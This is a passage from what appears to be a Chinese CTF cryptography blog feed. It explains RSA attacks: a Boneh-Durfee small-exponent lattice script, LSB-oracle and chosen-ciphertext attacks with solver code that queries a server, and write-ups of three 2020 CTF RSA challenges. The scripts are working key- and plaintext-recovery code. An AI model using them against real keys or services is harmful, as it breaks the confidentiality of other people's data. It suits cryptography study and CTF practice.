class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"optimizing basis of the lattice via LLL, this can take a long time"</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"LLL is done!"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"looking for independent vectors in the lattice"</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> range(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> range(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"found them, using vectors"</span>, pol1_idx, <span class="string">"and"</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        print(<span class="string">"no independant vectors could be found. This should very rarely happen..."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(soly) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Your prediction (delta) is too small"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">0xc2fd2913bae61f845ac94e4ee1bb10d8531dda830d31bb221dac5f179a8f883f15046d7aa179aff848db2734b8f88cc73d09f35c445c74ee35b01a96eb7b0a6ad9cb9ccd6c02c3f8c55ecabb55501bb2c318a38cac2db69d510e152756054aaed064ac2a454e46d9b3b755b67b46906fbff8dd9aeca6755909333f5f81bf74db</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">0x19441f679c9609f2484eb9b2658d7138252b847b2ed8ad182be7976ed57a3e441af14897ce041f3e07916445b88181c22f510150584eee4b0f776a5a487a4472a99f2ddc95efdd2b380ab4480533808b8c92e63ace57fb42bac8315fa487d03bec86d854314bc2ec4f99b192bb98710be151599d60f224114f6b33f47e357517</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.18</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = int((<span class="number">1</span><span class="number">-2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don't touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = int((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== checking values ==="</span>)</span><br><span class="line">        print(<span class="string">"* delta:"</span>, delta)</span><br><span class="line">        print(<span class="string">"* delta &lt; 0.292"</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        print(<span class="string">"* size of e:"</span>, int(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        print(<span class="string">"* size of N:"</span>, int(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        print(<span class="string">"* m:"</span>, m, <span class="string">", t:"</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== running algorithm ==="</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"=== solution found ==="</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            print(<span class="string">"x:"</span>, solx)</span><br><span class="line">            print(<span class="string">"y:"</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = int(pol(solx, soly) / e)</span><br><span class="line">        print(<span class="string">"private key found:"</span>, d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"=== no solution was found ==="</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print((<span class="string">"=== %s seconds ==="</span> % (time.time() - start_time)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure><h1 id="RSA-LSB-Oracle-Attack"><a href="#RSA-LSB-Oracle-Attack" class="headerlink" title="RSA LSB Oracle Attack"></a>RSA LSB Oracle Attack</h1><p>适用情况：可以选择密文发送给服务器，并且服务器返回解密密文后的明文的<strong>最低位(LSB)</strong>。</p><p>在一次RSA加密中，明文为m，模数为n，加密指数为e，密文为c。我们可以构造出$c’\equiv ((2^e)\cdot c) \equiv ((2^e)\cdot (m^e))\equiv ((2\cdot m)^e) \pmod n$， 因为m的两倍可能大于n，所以经过解密得到的明文是 $m’\equiv (2\cdot m)\pmod n$ 。我们还能够知道 m’ 的最低位lsb 是1还是0。 因为n是奇数，而$2\cdot m$是偶数，所以如果lsb 是0，说明$(2\cdot m)%n$ 是偶数，没有超过n，即$m&lt;\frac{n}{2}$，反之则$m&gt;\frac{n}{2}$。</p><p>举个例子就能明白2 % 3=2 是偶数，而4 % 3=1 是奇数。以此类推，构造密文$c’’\equiv 4^e\cdot c \pmod n$ 使其解密后为$m’’\equiv (4\cdot m)\pmod n$ ，判断$m’’$ 的奇偶性可以知道m 和 $\frac{n}{4}$ 的大小关系。所以我们就有了一个二分算法，可以在对数时间内将m的范围逼近到一个足够狭窄的空间。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_lsb</span><span class="params">(c)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    sh.sendline(str(c))</span><br><span class="line">    rev = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> int(rev)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c,n,t)</span>:</span></span><br><span class="line">    L=<span class="number">0</span></span><br><span class="line">    H=n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">        c = (t*c) % n</span><br><span class="line">        <span class="keyword">if</span> get_lsb(c) == <span class="number">0</span>:</span><br><span class="line">            H = (L+H) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            L = (L+H) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(L)</span><br><span class="line"></span><br><span class="line">oracle(c, n, pow(m,<span class="number">2</span>,n))</span><br></pre></td></tr></table></figure><p>上面的脚本在最后会出现一些误差，大约一到两个字符，具体原因尚不明确，但是下面这个脚本是没有误差的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lsb_oracle_attack</span><span class="params">(encrypted_flag, n, e)</span>:</span></span><br><span class="line"></span><br><span class="line">    flag_count = n_count = <span class="number">1</span></span><br><span class="line">    flag_lower_bound = <span class="number">0</span></span><br><span class="line">    flag_upper_bound = n</span><br><span class="line">    ciphertext = encrypted_flag</span><br><span class="line">    mult = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> flag_upper_bound &gt; flag_lower_bound + <span class="number">1</span>:</span><br><span class="line">        ciphertext = (ciphertext * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        flag_count *= <span class="number">2</span></span><br><span class="line">        n_count = n_count * <span class="number">2</span> - <span class="number">1</span></span><br><span class="line">        print(<span class="string">"bit = %d"</span> % mult)</span><br><span class="line">        mult += <span class="number">1</span></span><br><span class="line">        data=get_lsb(str(ciphertext))</span><br><span class="line">        <span class="keyword">if</span>(data==<span class="number">1</span>):</span><br><span class="line">            flag_upper_bound = n * n_count / flag_count</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag_lower_bound = n * n_count / flag_count</span><br><span class="line">            n_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> flag_upper_bound</span><br></pre></td></tr></table></figure><h1 id="选择密文攻击"><a href="#选择密文攻击" class="headerlink" title="选择密文攻击"></a>选择密文攻击</h1><p>适用情况：可以构造任意密文，服务器会解密密文并返回对应明文。【LSB Oracle Attack的简易版本】</p><p>利用RSA的乘法同态性质就好。</p><p>这个好理解，在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，</p><p>选取$x$以满足$gcd(x,n) =1$ 从而使$x$模$n$的逆存在，</p><p>构造密文$c’ \equiv c\cdot (x^e)  \pmod n$使解密后明文为$m’ \equiv (m\cdot x) \pmod n$，</p><p>则$m\equiv m’\cdot x^{-1} \pmod n $。</p><p>可参看模意义下的运算法则部分。【$x^{-1} = inverse(x,n)$】</p><h1 id="RSA经典非预期"><a href="#RSA经典非预期" class="headerlink" title="RSA经典非预期"></a>RSA经典非预期</h1><p>这里最后来一个RSA偶尔出现的经典非预期</p><p>如果出题人没有设置好明文填充，而是单单把flag作为明文的话，通常情况下这个明文都会比较短，短到$m&lt;p$，（$p$是模数$n$的一个分解）那么我们就可以直接利用$p$作为模数然后正常求解RSA就可以求解得到明文了。2020祥云杯的more_calc这一题就可以直接这样子一把梭。（预期解的原理推起来还挺麻烦的，回头可以记录一下）</p><p>至于为啥？$c \equiv m^e \pmod n \rightarrow c \equiv m^e \pmod p$，好推的，自己试试~</p><h1 id="Coppersmith相关"><a href="#Coppersmith相关" class="headerlink" title="Coppersmith相关"></a>Coppersmith相关</h1><p>移步<a href="https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/">密码学学习笔记 之 Coppersmith’s Method</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 CTF</title>
      <link href="/2020/12/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BCTF/"/>
      <url>/2020/12/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BCTF/</url>
      
        <content type="html"><![CDATA[<p>这里是对在CTF比赛中遇见到的自认为比较好的一些题目的收集。有一些在比赛小屋就已经做了分析的，这里可能只会提一手，主要是分析那些落单的但不错的题目。</p><h3 id="2020祥云杯-more-calc"><a href="#2020祥云杯-more-calc" class="headerlink" title="2020祥云杯-more_calc"></a>2020祥云杯-more_calc</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = b<span class="string">"flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getStrongPrime(2048)</span><br><span class="line">for i in range(1, (p+1)//2):</span><br><span class="line">    s += pow(i, p-2, p)</span><br><span class="line">s = s % p</span><br><span class="line">q = gmpy2.next_prime(s)</span><br><span class="line">n = p*q</span><br><span class="line">e = 0x10001</span><br><span class="line">c = pow(bytes_to_long(flag), e, n)</span><br><span class="line">print(p)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><p>是魔改的奥数题(2012年新加坡数学奥林匹克)，可恶，欺负人。</p><p>已经有大佬做了<a href="https://blog.csdn.net/cccchhhh6819/article/details/110302200" target="_blank" rel="noopener">预期解</a>的分析了。</p><p>由于模数为素数p，所以阶为p-1，所以p-2其实就相当于-1，即题目要求计算</p><p>$1^{-1}+2^{-1}+\dots+(\frac{p-1}{2})^{-1} \pmod p $</p><p>然后由于一个组合数的性质$C^{2i}_p = \frac{p(p-1)(p-2)\dots(p-(2i-1))}{(2i)!}$</p><p>$\frac{2i}{p}C^{2i}_p = \frac{(p-1)(p-2)\dots(p-(2i-1))}{(2i-1)!}\equiv \frac{(-1)(-2)\dots(-(2i-1))}{(2i-1)!}\equiv -1 \pmod p$</p><p>所以有$\sum_\limits{i=1}^{\frac{p-1}{2}}i^{-1}=-\sum_\limits{i=1}^{\frac{p-1}{2}}i^{-1}\frac{2i}{p}C^{2i}_p=-\frac{2}{p}\sum_\limits{i=1}^{\frac{p-1}{2}}C^{2i}_p$</p><p>注意到$\sum_\limits{i=1}^{\frac{p-1}{2}}C^{2i}_p$从意义上代表从p个元素中取出偶数个元素的方法。由于p是奇数，所以从p个元素中取出偶数个元素的方法数等于从p个元素中取出奇数个元素的方法数，且二者之和为从p中取出元素的方法数$2 ^ p$（这我没证，不过随便测了下是这样的）。由于没有计算取出0个元素的情况，所以此处有$\sum_\limits{i=1}^{\frac{p-1}{2}}C^{2i}_p = 2^{p-1}-1$</p><p>即$\sum_\limits{i=1}^{\frac{p-1}{2}}i^{-1}\equiv -\frac{2}{p}(2^{p-1}-1)\equiv -(\frac{2^p-2}{p})\pmod p $</p><p>单单这么看会有个大问题，就是，模p的话，$2^{p}$不是等于2么，2-2=0，那么就是0除0了呀。</p><p>实际代码操作是这样的：s = p - (pow(2, p, p*p)-2)//p</p><p>这么去理解，式子的意思可以看成先运算(整除)，最后取余，但是如果真的去这么运算，由于p太大，从而导致$2^p$也过于巨大了，所以需要做一些优化。</p><p>我们可以类比到进制上，比如十进制，(看成p=10)，如果模100然后整除10，那么其实就是为了取得这个数十位上的数字，这等价于先整除10再模10，</p><p>再回到我们这里，先整除$p$，再模掉$p$，也即等价于，先模掉$p^2$，再整除$p$</p><p>所以最终预期解题代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">s = p - (pow(<span class="number">2</span>, p, p*p)<span class="number">-2</span>)//p</span><br><span class="line">q = nextprime(s)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(pow(c, d, n))</span><br></pre></td></tr></table></figure><p>这道题的非预期好修复的，给flag做好padding，让flag&gt;&gt;p就好了。    </p><p>（不如这个板块整成每日一题好了）</p><p>——记录于2020.12.18</p><h3 id="2020蓝帽杯-RSA"><a href="#2020蓝帽杯-RSA" class="headerlink" title="2020蓝帽杯-RSA"></a>2020蓝帽杯-RSA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG,HINT</span><br><span class="line"><span class="keyword">assert</span> len(HINT) &lt; len(FLAG)</span><br><span class="line"><span class="keyword">assert</span> len(FLAG) == <span class="number">38</span></span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">2048</span>)</span><br><span class="line">q1 = getPrime(<span class="number">2048</span>)</span><br><span class="line">n1 = p1*q1</span><br><span class="line">e1 = <span class="number">321959</span></span><br><span class="line">e2 = <span class="number">250261</span></span><br><span class="line">c1 = pow(bytes_to_long(HINT),e1,n1)</span><br><span class="line">c2 = pow(bytes_to_long(HINT),e2,n1)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'n1=&#123;&#125;'</span>.format(n1))</span><br><span class="line">print(<span class="string">'c1=&#123;&#125;'</span>.format(c1))</span><br><span class="line">print(<span class="string">'c2=&#123;&#125;'</span>.format(c2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p2 = getPrime(<span class="number">2048</span>)</span><br><span class="line">q2 = getPrime(<span class="number">2048</span>)</span><br><span class="line">n2 = p2*q2</span><br><span class="line">e3 = <span class="number">386321</span></span><br><span class="line">e4 = <span class="number">216437</span></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(FLAG)*bytes_to_long(HINT)</span><br><span class="line">c3 = pow(flag,e3,n2)</span><br><span class="line">c4 = pow(flag,e4,n2)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'n2=&#123;&#125;'</span>.format(n2))</span><br><span class="line">print(<span class="string">'c3=&#123;&#125;'</span>.format(c3))</span><br><span class="line">print(<span class="string">'c4=&#123;&#125;'</span>.format(c4))</span><br></pre></td></tr></table></figure><p>这道题目比较简单，但也稍微有那么一点变型在里面。</p><p>首先是一个比较明显的共模攻击，但是这里还是需要对共模攻击以及$egcd$算法有一点理解，至少知道共模攻击的原理以及$egcd$算法的作用。</p><p>第一步如果跑正常的共模攻击的脚本的话，由于$gcd(e_1,e_2)=11$，所以得到的会是$hint^{11} \pmod n$，这里$hint^{11}$小于$n$，所以直接开11次根就好，拿到$hint$</p><p>然后第二步这里他的$flag$是$flag * hint$，同第一步一样，由于$gcd(e_3, e_4)=13$，这里用共模攻击得到会是$（flag * hint)^{13} \pmod n$ ，这里由于（$flag * hint) ^ {13} $大于$n$，所以直接开根就不能得到$flag * hint$。但这里因为我们已经知道$hint$的值了，我们可以先把结果乘以$hint^{13}$的逆，这样子得到的就是$flag^{13}$， 最后给它开13次根就能得到$flag$了。</p><p>（水了一题，略略~）</p><p>——记录于2020.12.19</p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 RoarCTF</title>
      <link href="/2020/12/10/2020RoarCTF/"/>
      <url>/2020/12/10/2020RoarCTF/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://www.anquanke.com/post/id/224973" target="_blank" rel="noopener">安全客</a></p><p>这次比赛密码学一共有四题，除了EZRSA真的比较easy，其他题还是有一些做头 ，尤其最后一道ECDSA个人感觉出的挺不错的。</p><p>先来两道RSA</p><h2 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number <span class="built_in">import</span> *</span><br><span class="line">from gmpy2 <span class="built_in">import</span> *</span><br><span class="line">from secret <span class="built_in">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag.startwith('flag&#123;')) <span class="literal">and</span> (flag.endwith('&#125;'))</span><br><span class="line"><span class="keyword">assert</span>(is_prime(beta) <span class="literal">and</span> len(bin(beta)[<span class="number">2</span>:]) == <span class="number">512</span>) </span><br><span class="line"><span class="keyword">assert</span>(len(bin(x)[<span class="number">2</span>:]) == len(bin(y)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># This is tip!!!</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="attr">tip</span> == <span class="number">2</span>*x*y*beta + x + y)</span><br><span class="line"></span><br><span class="line"><span class="attr">p</span> = <span class="number">2</span>*x*beta + <span class="number">1</span></span><br><span class="line"><span class="attr">q</span> = <span class="number">2</span>*y*beta + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(is_prime(p) <span class="literal">and</span> is_prime(q))</span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = p*q</span><br><span class="line"><span class="attr">e</span> = <span class="number">65537</span></span><br><span class="line"><span class="attr">m</span> = bytes_to_long(flag)</span><br><span class="line"><span class="attr">enc</span> = powmod(m,e,n)   </span><br><span class="line"></span><br><span class="line"><span class="comment">#n = </span></span><br><span class="line"><span class="comment">#beta = </span></span><br><span class="line"><span class="comment">#e =</span></span><br></pre></td></tr></table></figure><p>题目提供了n，beta，e</p><p>这道题意思很明确了，n = p * q = 4xybeta ^ 2  + 2(x+y )beta + 1</p><p>很自然的能得到 tip = (n-1) //（2 * beta） </p><p>然后我们给tip模上beta，我们就能得到 (x+y)%beta ，如果我们能够获得x + y，那么显然我们也能获得x * y，然后解个方程即可获得x和y，然后就能获得p和q，继而解密rsa得到flag</p><p>那么对于获得 x + y这个问题，由于beta是512位，我们去看一下n的位数为 2068，那么平均一下p的位数就是1034了，那么x的位数大概就是1034 - 1 - 512 = 521，x + y 估计也就是522位左右，和beta位数差了10位左右，完全是可以暴力的范围</p><p>参考脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n =</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">enc = </span><br><span class="line">beta =</span><br><span class="line">tip = (n<span class="number">-1</span>)//(<span class="number">2</span>*beta)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    <span class="comment">#获取x + y的值</span></span><br><span class="line">    x_add_y = tip % beta + beta*i</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#根据x + y 获取 x * y</span></span><br><span class="line">    x_mul_y = (tip - x_add_y)//(<span class="number">2</span>*beta)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> iroot(x_add_y**<span class="number">2</span> - <span class="number">4</span>*x_mul_y,<span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">            <span class="comment">#解方程获取x 和 y</span></span><br><span class="line">            y = (x_add_y - iroot(x_add_y**<span class="number">2</span> - <span class="number">4</span>*x_mul_y,<span class="number">2</span>)[<span class="number">0</span>] )//<span class="number">2</span></span><br><span class="line">            x = x_add_y - y</span><br><span class="line">            p = <span class="number">2</span>*y*beta + <span class="number">1</span></span><br><span class="line">            q = <span class="number">2</span>*x*beta + <span class="number">1</span></span><br><span class="line">            phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">            d = inverse(e,int(phi))</span><br><span class="line">            <span class="keyword">print</span> 